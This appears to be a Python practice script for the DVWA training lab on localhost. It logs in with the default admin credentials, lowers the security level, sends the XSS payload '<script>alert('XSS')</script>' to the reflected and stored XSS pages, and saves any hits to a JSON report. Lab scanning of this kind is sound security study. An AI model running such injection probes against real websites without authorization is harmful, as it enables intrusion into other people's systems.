import requests
from bs4 import BeautifulSoup
import json

session = requests.Session()


#  Login
# -------------------------------
login_page = session.get("http://localhost/dvwa/login.php")
soup = BeautifulSoup(login_page.text, "html.parser")
user_token = soup.find("input", {"name": "user_token"})["value"]

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token
}

session.post("http://localhost/dvwa/login.php", data=login_data)

# Set Security Level LOW
# -------------------------------
security_page = session.get("http://localhost/dvwa/security.php")
soup = BeautifulSoup(security_page.text, "html.parser")
security_token = soup.find("input", {"name": "user_token"})["value"]

security_data = {
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": security_token
}

session.post("http://localhost/dvwa/security.php", data=security_data)

print("Login & Security Level Set to LOW ✅")


#  XSS Testing
# -------------------------------

target_urls = [
    "http://localhost/dvwa/vulnerabilities/xss_r/",
    "http://localhost/dvwa/vulnerabilities/xss_s/"
]

payload = "<script>alert('XSS')</script>"

xss_results = []

for target_url in target_urls:

    print("\n-------------------------------------")
    print("Scanning Target URL:", target_url)
   
    

    params = {
        "name": payload,
        "Submit": "Submit"
    }

    response = session.get(target_url, params=params)

    print("Testing XSS Payload...")
    print("Response Code:", response.status_code)

    if payload in response.text:
        print("[+] Reflected XSS Vulnerable!")

        xss_results.append({
            "url": target_url,
            "payload": payload,
            "severity": "High"
        })
    else:
        print("[-] Not Vulnerable")

#Save Report
# -------------------------------

if xss_results:
    with open("xss_report.json", "w") as f:
        json.dump(xss_results, f, indent=4)
    print("✅ XSS Report Saved as xss_report.json")